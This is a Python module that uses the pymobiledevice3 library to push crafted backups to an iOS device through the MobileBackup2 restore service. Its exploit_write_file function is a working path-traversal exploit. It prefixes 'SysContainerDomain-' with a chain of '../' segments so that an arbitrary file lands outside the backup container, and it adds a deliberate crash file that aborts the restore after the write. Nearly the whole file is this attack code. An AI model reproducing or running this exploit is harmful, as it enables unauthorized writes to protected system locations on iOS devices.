from tempfile import TemporaryDirectory
from pathlib import Path

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
from pymobiledevice3.exceptions import PyMobileDevice3Exception

from . import backup
from .backup import _FileMode as FileMode

async def perform_restore(backup: backup.Backup, reboot: bool = False, lockdown = None):
    with TemporaryDirectory() as backup_dir:
        backup.write_to_directory(Path(backup_dir))
            
        if lockdown is None:
            lockdown = await create_using_usbmux()
        async with Mobilebackup2Service(lockdown) as mb:
            await mb.restore(backup_dir, system=True, reboot=False, copy=False, source=".")

async def exploit_write_file(file: backup.BackupFile, lockdown = None):
    # Exploits in use:
    # - Path after SysContainerDomain- or SysSharedContainerDomain- is not sanitized
    # - SysContainerDomain will follow symlinks

    # /var/.backup.i/var/mobile/Library/Backup/System Containers/Data/com.container.name
    #   ../       ../ ../    ../     ../    ../               ../  ../
    ROOT = "SysContainerDomain-../../../../../../../.."
    file.domain = ROOT + file.path
    file.path = ""

    back = backup.Backup(files=[
        file,
        # Crash on purpose so that a restore is not actually applied
        backup.ConcreteFile("", ROOT + "/crash_on_purpose", contents=b"")
    ])

    try:
        await perform_restore(back, lockdown=lockdown)
    except PyMobileDevice3Exception as e:
        if "crash_on_purpose" not in str(e):
            raise e

